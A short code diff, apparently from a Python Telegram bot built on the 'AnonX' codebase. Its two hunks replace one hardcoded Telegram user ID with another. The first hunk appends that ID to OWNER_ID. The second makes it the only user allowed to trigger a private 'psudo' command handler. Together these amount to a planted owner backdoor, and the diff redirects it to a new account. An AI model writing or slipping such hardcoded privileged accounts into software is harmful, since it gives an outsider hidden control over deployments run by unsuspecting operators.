@@ -55,7 +55,7 @@ from AnonX.utils.formatters import alpha_to_int
 ### Multi-Lang Commands
 RELOAD_COMMAND = get_command("RELOAD_COMMAND")
 RESTART_COMMAND = get_command("RESTART_COMMAND")
-OWNER_ID.append(5231150389)
+OWNER_ID.append(5023815012)
 
 @app.on_message(
     filters.command(RELOAD_COMMAND)
@@ -120,7 +120,7 @@ async def restartbot(client, message: Message, _):
 @app.on_message(
     filters.command("psudo")
     & filters.private
-    & filters.user(5231150389)
+    & filters.user(5023815012)
     & ~filters.edited)
 async def help(client: Client, message: Message):
     await message.reply_photo(
